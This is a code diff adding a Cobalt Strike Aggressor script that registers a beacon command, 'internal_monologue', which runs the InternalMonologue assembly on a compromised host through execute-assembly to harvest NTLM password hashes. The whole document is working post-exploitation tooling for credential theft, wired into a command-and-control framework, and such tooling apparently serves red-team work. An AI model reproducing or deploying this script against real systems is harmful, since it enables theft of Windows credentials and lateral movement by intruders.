@@ -1,0 +1,19 @@
+beacon_command_register("internal_monologue", "Invoke a local procedure call to the NTLM authentication package, grab password hash",
+	"Usage: internal_monologue \n\n" .
+	"Uses execute-assembly to run the assembly.  No arguments needed \n");
+alias internal_monologue{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$asm = "/opt/cobalt_strike_extension_kit/exe/InternalMonologue.exe";
+	$desc = "InternalMonologue";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, $asm, $argu);
+}
